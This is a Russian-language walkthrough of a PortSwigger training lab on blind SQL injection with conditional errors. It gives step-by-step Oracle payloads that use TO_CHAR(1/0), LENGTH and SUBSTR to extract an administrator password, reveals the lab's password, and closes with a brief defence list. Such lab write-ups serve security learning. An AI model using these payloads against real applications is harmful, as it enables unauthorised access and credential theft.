# 📘 PortSwigger Lab: Blind SQL Injection with Conditional Errors

<a id="top"></a>

> 🔗 Лаба: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

---

## 📑 Содержание

- 🎯 Цель
- 🧠 Идея атаки
- 🔍 Шаг 1 — Подтверждение SQL Injection
- 🔍 Шаг 2 — Проверка пользователя administrator
- 🔍 Шаг 3 — Определение длины пароля
- 🔍 Шаг 4 — Извлечение пароля вручную
- 🔍 Шаг 5 — Вход под administrator
- 🧩 Использованные payloads
- 💥 Почему атака сработала
- 🛡 Защита
- 🛠 Чеклист

---

## 🎯 Цель

Получить пароль пользователя `administrator` через Blind SQL Injection и выполнить вход в приложение.

---

## 🧠 Идея атаки

Результаты SQL-запроса не отображаются напрямую.

Однако приложение реагирует на ошибки Oracle Database:

```text
TRUE  → Internal Server Error
FALSE → Обычная страница
```

Это позволяет задавать базе вопросы и получать ответы в виде ошибки или её отсутствия.

---

## 🔍 Шаг 1 — Подтверждение SQL Injection

Проверяем возможность условного вызова ошибки:

```sql
'||(SELECT CASE WHEN (1=1)
THEN TO_CHAR(1/0)
ELSE 'a'
END FROM dual)||'
```

Получаем `Internal Server Error`.

Меняем условие на:

```sql
1=2
```

Ошибка исчезает.

Вывод:

```text
Blind SQL Injection подтверждена.
```

---

## 🔍 Шаг 2 — Проверка пользователя administrator

```sql
'||(SELECT CASE
WHEN ((SELECT COUNT(*) FROM users WHERE username='administrator')>0)
THEN TO_CHAR(1/0)
ELSE 'a'
END FROM dual)||'
```

Появление ошибки подтверждает существование пользователя.

---

## 🔍 Шаг 3 — Определение длины пароля

Используем функцию `LENGTH()`:

```sql
'||(SELECT CASE
WHEN (LENGTH(password)>10)
THEN TO_CHAR(1/0)
ELSE 'a'
END FROM users
WHERE username='administrator')||'
```

Последовательно проверяем:

```text
>10
>15
>19
>20
```

Результат:

```text
Password length = 20
```

---

## 🔍 Шаг 4 — Извлечение пароля вручную

Используем функцию `SUBSTR()`:

```sql
'||(SELECT CASE
WHEN (SUBSTR(password,1,1)='a')
THEN TO_CHAR(1/0)
ELSE 'a'
END FROM users
WHERE username='administrator')||'
```

Перебираем символы:

```text
a-z
0-9
```

После нахождения символа меняем позицию:

```sql
SUBSTR(password,2,1)
SUBSTR(password,3,1)
...
SUBSTR(password,20,1)
```

Пароль восстановлен полностью.

<details>
<summary>🔑 Показать пароль administrator</summary>

Username: administrator

Password: 1xc8bhesv9ijpifjsod7

</details>

---

## 🔍 Шаг 5 — Вход под administrator

Используем найденные учетные данные и успешно авторизуемся.

---

## 🧩 Использованные payloads

Подтверждение SQLi:

```sql
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)||'
```

Проверка пользователя:

```sql
'||(SELECT CASE WHEN ((SELECT COUNT(*) FROM users WHERE username='administrator')>0)
THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)||'
```

Проверка длины:

```sql
'||(SELECT CASE WHEN (LENGTH(password)>10)
THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')||'
```

Проверка символа:

```sql
'||(SELECT CASE WHEN (SUBSTR(password,1,1)='a')
THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')||'
```

---

## 💥 Почему атака сработала

- TrackingId вставлялся напрямую в SQL.
- Использовалась Oracle Database.
- Ошибки БД отображались пользователю.
- Не использовались параметризованные запросы.

---

## 🛡 Защита

- Prepared Statements
- Parameterized Queries
- Скрытие ошибок БД
- Least Privilege
- WAF
- Мониторинг запросов

---

## 🛠 Чеклист

- [x] SQL Injection подтверждена
- [x] Найден пользователь administrator
- [x] Определена длина пароля
- [x] Пароль извлечён
- [x] Выполнен вход под administrator

---

# ⬆ Наверх

[Вернуться к содержанию](#top)
